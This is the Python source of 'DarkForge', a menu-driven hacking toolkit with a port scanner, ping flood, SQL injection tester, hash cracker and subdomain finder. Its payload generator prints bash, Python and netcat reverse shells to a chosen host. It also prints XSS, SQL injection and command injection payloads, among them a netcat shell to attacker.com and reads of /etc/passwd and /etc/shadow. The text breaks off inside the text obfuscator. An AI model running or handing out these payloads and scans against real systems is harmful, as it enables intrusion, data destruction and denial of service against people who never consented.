#!/usr/bin/env python3

import os
import sys
import time
import socket
import subprocess
import threading
import random
import base64
import hashlib
import re
import uuid
import platform
import json
import urllib.request
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests

try:
    from colorama import init, Fore, Back, Style
    init()
except ImportError:
    os.system('pip install colorama')
    from colorama import init, Fore, Back, Style
    init()

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    BLINK = '\033[5m'

class DarkForge:
    def __init__(self):
        self.version = "2.1.0"
        self.author = "@sentinelzxofc"
        self.repo = ".com/sentinelzxofc/DarkForge"
        self.clear_screen()
        self.show_banner()
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        
    def show_banner(self):
        banner = f"""
{Colors.RED}
██████╗  █████╗ ██████╗ ██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
██║  ██║███████║██████╔╝█████╔╝ █████╗  ██║   ██║██████╔╝██║  ███╗█████╗  
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  
██████╔╝██║  ██║██║  ██║██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{Colors.END}
{Colors.CYAN}                    ╔══════════════════════════════════════╗
                    ║        ULTIMATE HACKING TOOLKIT         ║
                    ║              Version {self.version}              ║
                    ║          by: {self.author}           ║
                    ║      {self.repo}      ║
                    ╚══════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}[!] WARNING: This tool is for educational purposes only!{Colors.END}
{Colors.GREEN}[+] Loaded successfully on {platform.system()} {platform.release()}{Colors.END}
"""
        print(banner)
        time.sleep(2)
        
    def loading_animation(self, text, duration=3):
        chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        end_time = time.time() + duration
        while time.time() < end_time:
            for char in chars:
                sys.stdout.write(f'\r{Colors.CYAN}[{char}] {text}{Colors.END}')
                sys.stdout.flush()
                time.sleep(0.1)
        sys.stdout.write(f'\r{Colors.GREEN}[✓] {text} - Complete!{Colors.END}\n')
        
    def main_menu(self):
        while True:
            self.clear_screen()
            self.show_banner()
            menu = f"""
{Colors.PURPLE}╔═══════════════════════════════════════════════════════════════╗
║                        MAIN MENU                              ║
╠═══════════════════════════════════════════════════════════════╣
║  {Colors.CYAN}[01]{Colors.PURPLE} Network Scanner          {Colors.CYAN}[11]{Colors.PURPLE} Password Generator      ║
║  {Colors.CYAN}[02]{Colors.PURPLE} Port Scanner             {Colors.CYAN}[12]{Colors.PURPLE} Hash Cracker            ║
║  {Colors.CYAN}[03]{Colors.PURPLE} Ping Flood               {Colors.CYAN}[13]{Colors.PURPLE} WiFi Scanner            ║
║  {Colors.CYAN}[04]{Colors.PURPLE} Encoder/Decoder          {Colors.CYAN}[14]{Colors.PURPLE} System Info             ║
║  {Colors.CYAN}[05]{Colors.PURPLE} Payload Generator        {Colors.CYAN}[15]{Colors.PURPLE} File Metadata           ║
║  {Colors.CYAN}[06]{Colors.PURPLE} IP Locator               {Colors.CYAN}[16]{Colors.PURPLE} Text Obfuscator         ║
║  {Colors.CYAN}[07]{Colors.PURPLE} Network Sniffer          {Colors.CYAN}[17]{Colors.PURPLE} Vulnerability Scanner   ║
║  {Colors.CYAN}[08]{Colors.PURPLE} Web Crawler              {Colors.CYAN}[18]{Colors.PURPLE} Steganography           ║
║  {Colors.CYAN}[09]{Colors.PURPLE} SQL Injection Tester     {Colors.CYAN}[19]{Colors.PURPLE} Terminal Shell          ║
║  {Colors.CYAN}[10]{Colors.PURPLE} Subdomain Finder         {Colors.CYAN}[00]{Colors.PURPLE} Exit                    ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
"""
            print(menu)
            choice = input(f"{Colors.YELLOW}[?] Select option: {Colors.END}")
            
            if choice == "01":
                self.network_scanner()
            elif choice == "02":
                self.port_scanner()
            elif choice == "03":
                self.ping_flood()
            elif choice == "04":
                self.encoder_decoder()
            elif choice == "05":
                self.payload_generator()
            elif choice == "06":
                self.ip_locator()
            elif choice == "07":
                self.network_sniffer()
            elif choice == "08":
                self.web_crawler()
            elif choice == "09":
                self.sql_injection_tester()
            elif choice == "10":
                self.subdomain_finder()
            elif choice == "11":
                self.password_generator()
            elif choice == "12":
                self.hash_cracker()
            elif choice == "13":
                self.wifi_scanner()
            elif choice == "14":
                self.system_info()
            elif choice == "15":
                self.file_metadata()
            elif choice == "16":
                self.text_obfuscator()
            elif choice == "17":
                self.vulnerability_scanner()
            elif choice == "18":
                self.steganography()
            elif choice == "19":
                self.terminal_shell()
            elif choice == "00":
                self.exit_program()
            else:
                print(f"{Colors.RED}[!] Invalid option!{Colors.END}")
                time.sleep(1)
                
    def network_scanner(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║           NETWORK SCANNER            ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        network = input(f"{Colors.YELLOW}[?] Enter network (e.g., 192.168.1.0/24): {Colors.END}")
        
        if not network:
            network = "192.168.1.0/24"
            
        self.loading_animation("Scanning network...")
        
        base_ip = network.split('/')[0].rsplit('.', 1)[0]
        active_hosts = []
        
        def ping_host(ip):
            try:
                response = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                       capture_output=True, text=True, timeout=2)
                if response.returncode == 0:
                    active_hosts.append(ip)
                    print(f"{Colors.GREEN}[+] {ip} - ACTIVE{Colors.END}")
            except:
                pass
                
        threads = []
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            thread = threading.Thread(target=ping_host, args=(ip,))
            threads.append(thread)
            thread.start()
            
        for thread in threads:
            thread.join()
            
        print(f"\n{Colors.CYAN}[*] Scan complete! Found {len(active_hosts)} active hosts{Colors.END}")
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def port_scanner(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║            PORT SCANNER              ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        target = input(f"{Colors.YELLOW}[?] Enter target IP/domain: {Colors.END}")
        start_port = int(input(f"{Colors.YELLOW}[?] Start port (default 1): {Colors.END}") or "1")
        end_port = int(input(f"{Colors.YELLOW}[?] End port (default 1000): {Colors.END}") or "1000")
        
        self.loading_animation(f"Scanning ports {start_port}-{end_port} on {target}...")
        
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    service = self.get_service_name(port)
                    print(f"{Colors.GREEN}[+] Port {port}/tcp - OPEN ({service}){Colors.END}")
                sock.close()
            except:
                pass
                
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(scan_port, range(start_port, end_port + 1))
            
        print(f"\n{Colors.CYAN}[*] Scan complete! Found {len(open_ports)} open ports{Colors.END}")
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def get_service_name(self, port):
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 993: "IMAPS",
            995: "POP3S", 3389: "RDP", 5432: "PostgreSQL", 3306: "MySQL"
        }
        return services.get(port, "Unknown")
        
    def ping_flood(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║             PING FLOOD               ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        target = input(f"{Colors.YELLOW}[?] Enter target IP/domain: {Colors.END}")
        count = int(input(f"{Colors.YELLOW}[?] Number of packets (default 100): {Colors.END}") or "100")
        
        print(f"{Colors.RED}[!] Starting ping flood to {target}...{Colors.END}")
        
        def ping_target():
            for i in range(count):
                try:
                    subprocess.run(['ping', '-c', '1', target], 
                                 capture_output=True, timeout=1)
                    print(f"{Colors.GREEN}[{i+1}/{count}] Packet sent to {target}{Colors.END}")
                    time.sleep(0.1)
                except:
                    print(f"{Colors.RED}[{i+1}/{count}] Failed to send packet{Colors.END}")
                    
        ping_target()
        print(f"{Colors.CYAN}[*] Ping flood complete!{Colors.END}")
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def encoder_decoder(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║          ENCODER/DECODER             ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        print(f"{Colors.PURPLE}[1] Base64 Encode/Decode")
        print(f"[2] URL Encode/Decode")
        print(f"[3] Hex Encode/Decode")
        print(f"[4] ROT13")
        print(f"[5] MD5 Hash")
        print(f"[6] SHA256 Hash{Colors.END}")
        
        choice = input(f"{Colors.YELLOW}[?] Select option: {Colors.END}")
        text = input(f"{Colors.YELLOW}[?] Enter text: {Colors.END}")
        
        if choice == "1":
            print(f"{Colors.GREEN}[+] Base64 Encoded: {base64.b64encode(text.encode()).decode()}{Colors.END}")
            try:
                print(f"{Colors.GREEN}[+] Base64 Decoded: {base64.b64decode(text).decode()}{Colors.END}")
            except:
                print(f"{Colors.RED}[!] Invalid Base64 string{Colors.END}")
        elif choice == "2":
            print(f"{Colors.GREEN}[+] URL Encoded: {urllib.parse.quote(text)}{Colors.END}")
            print(f"{Colors.GREEN}[+] URL Decoded: {urllib.parse.unquote(text)}{Colors.END}")
        elif choice == "3":
            print(f"{Colors.GREEN}[+] Hex Encoded: {text.encode().hex()}{Colors.END}")
            try:
                print(f"{Colors.GREEN}[+] Hex Decoded: {bytes.fromhex(text).decode()}{Colors.END}")
            except:
                print(f"{Colors.RED}[!] Invalid Hex string{Colors.END}")
        elif choice == "4":
            rot13 = text.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
            ))
            print(f"{Colors.GREEN}[+] ROT13: {rot13}{Colors.END}")
        elif choice == "5":
            md5_hash = hashlib.md5(text.encode()).hexdigest()
            print(f"{Colors.GREEN}[+] MD5: {md5_hash}{Colors.END}")
        elif choice == "6":
            sha256_hash = hashlib.sha256(text.encode()).hexdigest()
            print(f"{Colors.GREEN}[+] SHA256: {sha256_hash}{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def payload_generator(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║          PAYLOAD GENERATOR           ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        print(f"{Colors.PURPLE}[1] Reverse Shell (Bash)")
        print(f"[2] Reverse Shell (Python)")
        print(f"[3] Reverse Shell (Netcat)")
        print(f"[4] XSS Payload")
        print(f"[5] SQL Injection Payload")
        print(f"[6] Command Injection{Colors.END}")
        
        choice = input(f"{Colors.YELLOW}[?] Select payload type: {Colors.END}")
        
        if choice == "1":
            ip = input(f"{Colors.YELLOW}[?] Enter LHOST: {Colors.END}")
            port = input(f"{Colors.YELLOW}[?] Enter LPORT: {Colors.END}")
            payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            print(f"{Colors.GREEN}[+] Bash Reverse Shell: {payload}{Colors.END}")
            
        elif choice == "2":
            ip = input(f"{Colors.YELLOW}[?] Enter LHOST: {Colors.END}")
            port = input(f"{Colors.YELLOW}[?] Enter LPORT: {Colors.END}")
            payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            print(f"{Colors.GREEN}[+] Python Reverse Shell: {payload}{Colors.END}")
            
        elif choice == "3":
            ip = input(f"{Colors.YELLOW}[?] Enter LHOST: {Colors.END}")
            port = input(f"{Colors.YELLOW}[?] Enter LPORT: {Colors.END}")
            payload = f"nc -e /bin/sh {ip} {port}"
            print(f"{Colors.GREEN}[+] Netcat Reverse Shell: {payload}{Colors.END}")
            
        elif choice == "4":
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>"
            ]
            print(f"{Colors.GREEN}[+] XSS Payloads:{Colors.END}")
            for i, payload in enumerate(payloads, 1):
                print(f"{Colors.CYAN}[{i}] {payload}{Colors.END}")
                
        elif choice == "5":
            payloads = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1--",
                "admin'--"
            ]
            print(f"{Colors.GREEN}[+] SQL Injection Payloads:{Colors.END}")
            for i, payload in enumerate(payloads, 1):
                print(f"{Colors.CYAN}[{i}] {payload}{Colors.END}")
                
        elif choice == "6":
            payloads = [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "; cat /etc/shadow",
                "| nc -e /bin/sh attacker.com 4444"
            ]
            print(f"{Colors.GREEN}[+] Command Injection Payloads:{Colors.END}")
            for i, payload in enumerate(payloads, 1):
                print(f"{Colors.CYAN}[{i}] {payload}{Colors.END}")
                
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def ip_locator(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║             IP LOCATOR               ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        ip = input(f"{Colors.YELLOW}[?] Enter IP address (leave blank for your IP): {Colors.END}")
        
        if not ip:
            try:
                response = requests.get('https://api.ipify.org?format=json', timeout=5)
                ip = response.json()['ip']
                print(f"{Colors.GREEN}[+] Your public IP: {ip}{Colors.END}")
            except:
                print(f"{Colors.RED}[!] Failed to get your IP{Colors.END}")
                input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                return
                
        self.loading_animation(f"Locating IP {ip}...")
        
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=10)
            data = response.json()
            
            if data['status'] == 'success':
                print(f"{Colors.GREEN}╔══════════════════════════════════════╗")
                print(f"║              IP INFORMATION          ║")
                print(f"╠══════════════════════════════════════╣")
                print(f"║ IP: {data['query']:<30} ║")
                print(f"║ Country: {data['country']:<26} ║")
                print(f"║ Region: {data['regionName']:<27} ║")
                print(f"║ City: {data['city']:<29} ║")
                print(f"║ ISP: {data['isp']:<30} ║")
                print(f"║ Timezone: {data['timezone']:<25} ║")
                print(f"║ Lat/Lon: {data['lat']},{data['lon']:<20} ║")
                print(f"╚══════════════════════════════════════╝{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Failed to locate IP{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def network_sniffer(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║           NETWORK SNIFFER            ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        print(f"{Colors.YELLOW}[!] Monitoring network connections...{Colors.END}")
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.END}")
        
        try:
            while True:
                try:
                    result = subprocess.run(['netstat', '-tuln'], capture_output=True, text=True)
                    lines = result.stdout.split('\n')
                    
                    print(f"\n{Colors.GREEN}[+] Active Connections:{Colors.END}")
                    for line in lines[2:10]:
                        if line.strip():
                            print(f"{Colors.CYAN}{line}{Colors.END}")
                            
                    time.sleep(5)
                    self.clear_screen()
                    print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
                    print(f"║           NETWORK SNIFFER            ║")
                    print(f"╚══════════════════════════════════════╝{Colors.END}")
                    
                except subprocess.CalledProcessError:
                    print(f"{Colors.RED}[!] Error running netstat{Colors.END}")
                    break
                    
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Sniffer stopped{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def web_crawler(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║             WEB CRAWLER              ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        url = input(f"{Colors.YELLOW}[?] Enter target URL: {Colors.END}")
        depth = int(input(f"{Colors.YELLOW}[?] Crawl depth (default 2): {Colors.END}") or "2")
        
        if not url.startswith('http'):
            url = 'http://' + url
            
        self.loading_animation(f"Crawling {url}...")
        
        visited = set()
        to_visit = [url]
        found_urls = []
        
        def crawl_url(target_url, current_depth):
            if current_depth > depth or target_url in visited:
                return
                
            visited.add(target_url)
            
            try:
                response = requests.get(target_url, timeout=5)
                if response.status_code == 200:
                    found_urls.append(target_url)
                    print(f"{Colors.GREEN}[+] Found: {target_url}{Colors.END}")
                    
                    import re
                    links = re.findall(r'href=[\'"]?([^\'" >]+)', response.text)
                    for link in links[:10]:
                        if link.startswith('http'):
                            to_visit.append(link)
                        elif link.startswith('/'):
                            base_url = '/'.join(target_url.split('/')[:3])
                            to_visit.append(base_url + link)
                            
            except Exception as e:
                print(f"{Colors.RED}[!] Error crawling {target_url}: {str(e)}{Colors.END}")
                
        for i in range(min(len(to_visit), 20)):
            crawl_url(to_visit[i], 1)
            
        print(f"\n{Colors.CYAN}[*] Crawling complete! Found {len(found_urls)} URLs{Colors.END}")
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def sql_injection_tester(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║        SQL INJECTION TESTER          ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        url = input(f"{Colors.YELLOW}[?] Enter target URL with parameter: {Colors.END}")
        
        payloads = [
            "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\",
            "&", "&&", "|", "||", "^", "~", "<", ">", "!", "!=", "=", "==",
            "%", "%%", "_", "__", "-", "--", "+", "++", "*", "**", "/", "//",
            "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", "') OR ('1'='1",
            "' UNION SELECT NULL--", "'; DROP TABLE users--"
        ]
        
        self.loading_animation("Testing SQL injection vulnerabilities...")
        
        vulnerable = False
        
        for payload in payloads:
            try:
                test_url = url + urllib.parse.quote(payload)
                response = requests.get(test_url, timeout=5)
                
                error_patterns = [
                    "sql syntax", "mysql_fetch", "ora-", "microsoft ole db",
                    "odbc", "sqlite", "postgresql", "warning: mysql"
                ]
                
                for pattern in error_patterns:
                    if pattern in response.text.lower():
                        print(f"{Colors.RED}[!] Potential SQL injection found with payload: {payload}{Colors.END}")
                        vulnerable = True
                        break
                        
            except Exception as e:
                continue
                
        if not vulnerable:
            print(f"{Colors.GREEN}[+] No obvious SQL injection vulnerabilities found{Colors.END}")
        else:
            print(f"{Colors.RED}[!] Target appears vulnerable to SQL injection!{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def subdomain_finder(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║          SUBDOMAIN FINDER            ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        domain = input(f"{Colors.YELLOW}[?] Enter domain: {Colors.END}")
        
        subdomains = [
            "www", "mail", "ftp", "admin", "test", "dev", "staging", "api",
            "blog", "shop", "store", "news", "support", "help", "docs",
            "portal", "secure", "vpn", "remote", "server", "host", "ns1",
            "ns2", "mx", "pop", "imap", "smtp", "webmail", "cpanel",
            "whm", "plesk", "panel", "control", "manage", "login"
        ]
        
        self.loading_animation(f"Finding subdomains for {domain}...")
        
        found_subdomains = []
        
        def check_subdomain(sub):
            try:
                full_domain = f"{sub}.{domain}"
                socket.gethostbyname(full_domain)
                found_subdomains.append(full_domain)
                print(f"{Colors.GREEN}[+] Found: {full_domain}{Colors.END}")
            except:
                pass
                
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(check_subdomain, subdomains)
            
        print(f"\n{Colors.CYAN}[*] Found {len(found_subdomains)} subdomains{Colors.END}")
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def password_generator(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║         PASSWORD GENERATOR           ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        length = int(input(f"{Colors.YELLOW}[?] Password length (default 12): {Colors.END}") or "12")
        count = int(input(f"{Colors.YELLOW}[?] Number of passwords (default 5): {Colors.END}") or "5")
        
        print(f"{Colors.PURPLE}[1] Alphanumeric")
        print(f"[2] Alphanumeric + Symbols")
        print(f"[3] Numbers only")
        print(f"[4] Letters only{Colors.END}")
        
        choice = input(f"{Colors.YELLOW}[?] Select type: {Colors.END}")
        
        if choice == "1":
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        elif choice == "2":
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
        elif choice == "3":
            chars = "0123456789"
        elif choice == "4":
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        else:
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            
        print(f"\n{Colors.GREEN}[+] Generated passwords:{Colors.END}")
        for i in range(count):
            password = ''.join(random.choice(chars) for _ in range(length))
            print(f"{Colors.CYAN}[{i+1}] {password}{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def hash_cracker(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║            HASH CRACKER              ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        hash_value = input(f"{Colors.YELLOW}[?] Enter hash to crack: {Colors.END}")
        
        print(f"{Colors.PURPLE}[1] MD5")
        print(f"[2] SHA1")
        print(f"[3] SHA256{Colors.END}")
        
        hash_type = input(f"{Colors.YELLOW}[?] Select hash type: {Colors.END}")
        
        wordlist = [
            "password", "123456", "password123", "admin", "letmein",
            "welcome", "monkey", "1234567890", "qwerty", "abc123",
            "Password1", "password1", "root", "toor", "pass"
        ]
        
        self.loading_animation("Cracking hash...")
        
        found = False
        
        for word in wordlist:
            if hash_type == "1":
                test_hash = hashlib.md5(word.encode()).hexdigest()
            elif hash_type == "2":
                test_hash = hashlib.sha1(word.encode()).hexdigest()
            elif hash_type == "3":
                test_hash = hashlib.sha256(word.encode()).hexdigest()
            else:
                test_hash = hashlib.md5(word.encode()).hexdigest()
                
            if test_hash.lower() == hash_value.lower():
                print(f"{Colors.GREEN}[+] Hash cracked! Password: {word}{Colors.END}")
                found = True
                break
                
        if not found:
            print(f"{Colors.RED}[!] Hash not found in wordlist{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def wifi_scanner(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║            WIFI SCANNER              ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        self.loading_animation("Scanning for WiFi networks...")
        
        try:
            result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True)
            if result.returncode == 0:
                networks = []
                lines = result.stdout.split('\n')
                
                current_network = {}
                for line in lines:
                    if 'ESSID:' in line:
                        essid = line.split('ESSID:')[1].strip().strip('"')
                        if essid:
                            current_network['ESSID'] = essid
                    elif 'Quality=' in line:
                        quality = line.split('Quality=')[1].split(' ')[0]
                        current_network['Quality'] = quality
                    elif 'Encryption key:' in line:
                        encryption = 'Yes' if 'on' in line else 'No'
                        current_network['Encryption'] = encryption
                        if current_network.get('ESSID'):
                            networks.append(current_network.copy())
                        current_network = {}
                        
                print(f"{Colors.GREEN}[+] Found {len(networks)} networks:{Colors.END}")
                for i, network in enumerate(networks[:10], 1):
                    essid = network.get('ESSID', 'Hidden')
                    quality = network.get('Quality', 'Unknown')
                    encryption = network.get('Encryption', 'Unknown')
                    print(f"{Colors.CYAN}[{i}] {essid} - Quality: {quality} - Encrypted: {encryption}{Colors.END}")
                    
            else:
                print(f"{Colors.RED}[!] Failed to scan WiFi networks{Colors.END}")
                print(f"{Colors.YELLOW}[!] Try running as root or check if wireless interface exists{Colors.END}")
                
        except FileNotFoundError:
            print(f"{Colors.RED}[!] iwlist command not found{Colors.END}")
            print(f"{Colors.YELLOW}[!] Install wireless-tools package{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def system_info(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║            SYSTEM INFO               ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        self.loading_animation("Gathering system information...")
        
        info = {
            "System": platform.system(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Architecture": platform.architecture()[0],
            "Hostname": platform.node(),
            "Python Version": platform.python_version(),
            "User": os.getenv('USER', 'Unknown'),
            "Home Directory": os.path.expanduser('~'),
            "Current Directory": os.getcwd(),
            "Shell": os.getenv('SHELL', 'Unknown')
        }
        
        print(f"{Colors.GREEN}╔══════════════════════════════════════╗")
        print(f"║           SYSTEM INFORMATION         ║")
        print(f"╠══════════════════════════════════════╣")
        
        for key, value in info.items():
            print(f"║ {key}: {str(value)[:25]:<25} ║")
            
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        try:
            result = subprocess.run(['uname', '-a'], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"\n{Colors.CYAN}[+] Kernel Info: {result.stdout.strip()}{Colors.END}")
        except:
            pass
            
        try:
            with open('/proc/meminfo', 'r') as f:
                meminfo = f.read()
                for line in meminfo.split('\n')[:3]:
                    if line:
                        print(f"{Colors.CYAN}[+] {line}{Colors.END}")
        except:
            pass
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def file_metadata(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║           FILE METADATA              ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        filepath = input(f"{Colors.YELLOW}[?] Enter file path: {Colors.END}")
        
        if not os.path.exists(filepath):
            print(f"{Colors.RED}[!] File not found{Colors.END}")
            input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
            return
            
        self.loading_animation(f"Extracting metadata from {filepath}...")
        
        try:
            stat = os.stat(filepath)
            
            print(f"{Colors.GREEN}╔══════════════════════════════════════╗")
            print(f"║            FILE METADATA             ║")
            print(f"╠══════════════════════════════════════╣")
            print(f"║ File: {os.path.basename(filepath):<29} ║")
            print(f"║ Size: {stat.st_size} bytes{'':<20} ║")
            print(f"║ Mode: {oct(stat.st_mode):<29} ║")
            print(f"║ UID: {stat.st_uid:<30} ║")
            print(f"║ GID: {stat.st_gid:<30} ║")
            print(f"║ Created: {datetime.fromtimestamp(stat.st_ctime)}{'':<10} ║")
            print(f"║ Modified: {datetime.fromtimestamp(stat.st_mtime)}{'':<9} ║")
            print(f"║ Accessed: {datetime.fromtimestamp(stat.st_atime)}{'':<9} ║")
            print(f"╚══════════════════════════════════════╝{Colors.END}")
            
            with open(filepath, 'rb') as f:
                file_hash = hashlib.md5(f.read()).hexdigest()
                print(f"{Colors.CYAN}[+] MD5 Hash: {file_hash}{Colors.END}")
                
            if filepath.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                print(f"{Colors.YELLOW}[!] Image file detected{Colors.END}")
                
            elif filepath.lower().endswith(('.pdf', '.doc', '.docx')):
                print(f"{Colors.YELLOW}[!] Document file detected{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading file: {str(e)}{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def text_obfuscator(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║          TEXT OBFUSCATOR             ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        text = input(f"{Colors.YELLOW}[?] Enter text to obfuscate: {Colors.END}")
        
        print(f"{Colors.PURPLE}[1] Reverse")
        print(f"[2] Caesar Cipher")
        print(f"[3] Leetspeak")
        print(f"[4] Binary")
        print(f"[5] Morse Code{Colors.END}")
        
        choice = input(f"{Colors.YELLOW}[?] Select obfuscation method: {Colors.END}")
        
        if choice == "1":
            result = text[::-1]
            print(f"{Colors.GREEN}[+] Reversed: {result}{Colors.END}")
            
        elif choice == "2":
            shift = int(input(f"{Colors.YELLOW}[?] Enter shift value (1-25): {Colors.END}") or "3")
            result = ""
            for char in text:
                if char.isalpha():
                    ascii_offset = 65 if char.isupper() else 97
                    result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
                else:
                    result += char
